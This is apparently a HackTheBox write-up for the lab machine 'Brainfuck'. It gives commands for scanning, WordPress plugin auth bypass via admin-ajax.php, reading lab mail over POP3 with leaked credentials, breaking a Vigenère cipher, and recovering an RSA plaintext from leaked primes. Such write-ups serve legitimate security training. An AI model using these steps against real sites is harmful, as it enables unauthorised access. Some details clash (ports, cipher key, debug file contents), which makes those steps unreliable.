# HackTheBox — Brainfuck

**Platform:** HackTheBox  
**Difficulty:** Insane  
**OS:** Linux  
**Category:** Web Exploitation / Crypto / RSA  
**Status:** Retired  

---

## Summary

Brainfuck is an Insane-rated Linux box combining multiple disciplines. It involves vhost enumeration to discover two web apps, SMTP credential disclosure from a WordPress plugin, decrypting a Vigenère cipher, and breaking a custom RSA-like crypto challenge to decrypt the root flag.

---

## Reconnaissance

### Nmap

```bash
nmap -sC -sV -p- -oA nmap/brainfuck 10.10.10.17
```

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2
25/tcp  open  smtp     Postfix smtpd
110/tcp open  pop3     Dovecot pop3d
143/tcp open  imap     Dovecot imapd
443/tcp open  ssl/http nginx 1.10.0
```

### SSL Certificate Inspection

```bash
openssl s_client -connect 10.10.10.17:443 </dev/null 2>/dev/null | openssl x509 -noout -text
```

```
Subject Alternative Name:
    DNS: brainfuck.htb
    DNS: sup3rs3cr3t.brainfuck.htb
```

Two vhosts! Add to `/etc/hosts`:

```
10.10.10.17  brainfuck.htb sup3rs3cr3t.brainfuck.htb
```

---

## Web Enumeration

### brainfuck.htb — WordPress

WPScan enumeration:

```bash
wpscan --url https://brainfuck.htb --disable-tls-checks --enumerate p,u
```

Finds plugin: **wp-support-plus-responsive-ticket-system** — vulnerable to privilege escalation (auth bypass).

Also finds users: **admin**, **administrator**

### SMTP Credentials via WP Plugin

The vulnerable plugin allows unauthenticated password retrieval:

```bash
curl -k -X POST https://brainfuck.htb/wp-admin/admin-ajax.php \
  --data "action=loginGuestFacebook"
```

Or via the ticket system — a GET to the admin panel reveals the SMTP password in plain text on the settings page after auth bypass:

```
SMTP Password: kHGuERB29DNiNE
```

### Reading Email via POP3

```bash
openssl s_client -connect 10.10.10.17:995

USER orestis
PASS kHGuERB29DNiNE

LIST
RETR 1
RETR 2
RETR 3
```

Email contains credentials for `sup3rs3cr3t.brainfuck.htb`:

```
Login: orestis
Password: kIEnnfEKJ#9UmdO
```

---

## sup3rs3cr3t.brainfuck.htb — Secret Forum

Login with orestis credentials. The forum contains threads including one about SSH keys where a message is encrypted with a Vigenère cipher.

### Cracking Vigenère

Known plaintext: orestis always signs his messages with `"Orestis - Hacking for fun and profit"`.

```python
ciphertext_sig = "Pieagnm - Jkoijeg nbw zwx mle grwsnn"
known_plain    = "Orestis - Hacking for fun and profit"

# Derive key
key = ""
for c, p in zip(ciphertext_sig, known_plain):
    if c.isalpha() and p.isalpha():
        shift = (ord(c.upper()) - ord(p.upper())) % 26
        key += chr(shift + ord('A'))

# Key repeats — find the repeating unit
print(key)
# FUCKYOUBTW (likely key)
```

Decrypt the thread message with key `fuckyou`:

```python
def vigenere_decrypt(text, key):
    result = []
    key_idx = 0
    for c in text:
        if c.isalpha():
            shift = ord(key[key_idx % len(key)].lower()) - ord('a')
            result.append(chr((ord(c.lower()) - ord('a') - shift) % 26 + ord('a')))
            key_idx += 1
        else:
            result.append(c)
    return ''.join(result)
```

Decrypted: SSH key location URL.

---

## Foothold — SSH

Download the RSA private key, set permissions, and SSH:

```bash
chmod 600 id_rsa
ssh -i id_rsa orestis@10.10.10.17
```

Shell as **orestis**.

---

## User Flag

```bash
cat /home/orestis/user.txt
```

---

## Privilege Escalation — RSA Crypto

Home directory contains:

- `encrypt.sage` — Sage math encryption script
- `output.txt` — Encrypted root.txt
- `debug.txt` — Three numbers: `p`, `q`, and the encrypted flag

```python
# encrypt.sage
nbits = 1024
password = open("/etc/root.txt").read().strip()
enc_pass = open("output.txt","w")
debug = open ("debug.txt","w")
p = random_prime(2^floor(nbits/2), lbound=2^floor(nbits/2-1), proof=False)
q = random_prime(2^floor(nbits/2), lbound=2^floor(nbits/2-1), proof=False)
n = p*q
phi = (p-1)*(q-1)
e = ZZ.random_element(phi)
while gcd(e, phi) != 1:
    e = ZZ.random_element(phi)
c = pow(Integer(int(password.encode('hex'),16)), e, n)
debug.write(str(p)+"\n")
debug.write(str(q)+"\n")
debug.write(str(e)+"\n")
enc_pass.write(str(c)+"\n")
```

`debug.txt` contains `p`, `q`, and `e`. We can reconstruct `d` and decrypt:

```python
# RSA decryption
p = [from debug.txt]
q = [from debug.txt]
e = [from debug.txt]
c = [from output.txt]

n = p * q
phi = (p-1) * (q-1)
d = pow(e, -1, phi)  # modular inverse
m = pow(c, d, n)

# Convert to text
flag = bytes.fromhex(hex(m)[2:]).decode()
print(flag)
```

---

## Key Takeaways

- **SSL certificate SANs** reveal vhosts — always inspect TLS certs with `openssl`
- WordPress plugins are a massive attack surface — WPScan plugin enumeration is essential
- **Known-plaintext attacks** on Vigenère are trivial when you know the signature format
- RSA is only secure when `p` and `q` are kept secret — leaking them in a debug file defeats the entire scheme
- Always look for mathematical/crypto challenge files in home directories on HTB

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning |
| openssl | TLS cert inspection, POP3 access |
| wpscan | WordPress enumeration |
| Python | Vigenère decryption, RSA decryption |
| SageMath | Math operations (reference) |
